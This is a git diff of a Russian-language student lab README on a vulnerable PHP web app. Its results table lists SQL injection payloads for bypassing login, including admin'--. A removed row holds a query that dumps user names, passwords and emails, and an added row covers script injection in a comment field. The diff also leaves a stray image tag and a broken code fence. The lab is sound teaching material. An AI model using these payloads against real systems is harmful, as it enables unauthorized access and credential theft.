@@ -1,4 +1,4 @@
-# OKFKS_LabWork2
+<img width="1061" height="436" alt="image" src="https://github.com/user-attachments/assets/ae346078-995f-4458-8097-5241276e3d93" /># OKFKS_LabWork2
 
 # Создание новой базы данных
 
@@ -192,7 +192,8 @@ $comments_result = $conn->query("SELECT * FROM comments");
 | Действие | Результат |
 |----------|-----------|
 | Выполнить авторизацию без учетных данных ``` Логин: ' OR '1'='1 Пароль: ' OR '1'='1 ```| <img width="853" height="480" alt="image" src="https://github.com/user-attachments/assets/39c3b71c-c822-4ada-b73c-b68089e2597a" />|
-|Вход по учётной записью админа без пароля ``` Логин: admin'-- Пароль: 111 ``` |<img width="590" height="309" alt="image" src="https://github.com/user-attachments/assets/dff791e2-c734-47cb-b201-3c28b298ef66" /> |
-|Вывести учетные данные пользователей при помощи запрос  ```'), ('dump', (SELECT GROUP_CONCAT(username, ':', password, ':', email SEPARATOR '; ') FROM users)) #```|<img width="900" height="404" alt="image" src="https://github.com/user-attachments/assets/0c2dc600-fe9f-40df-8881-dae4fdb0aeb9" />|
+|Вход по учётной записью админа без пароля ``` Логин: admin'-- Пароль: 111 `` |<img width="590" height="309" alt="image" src="https://github.com/user-attachments/assets/dff791e2-c734-47cb-b201-3c28b298ef66" /> |
+|Вставить в поле ввода "Комментарий" скрипт 
+<img width="1008" height="304" alt="image" src="https://github.com/user-attachments/assets/6a39e164-ede3-47b7-9e2b-357d7444b685" /> | <img width="1061" height="436" alt="image" src="https://github.com/user-attachments/assets/1467eca9-880b-4ce3-bf8b-ff49d707fc00" />|
  
 
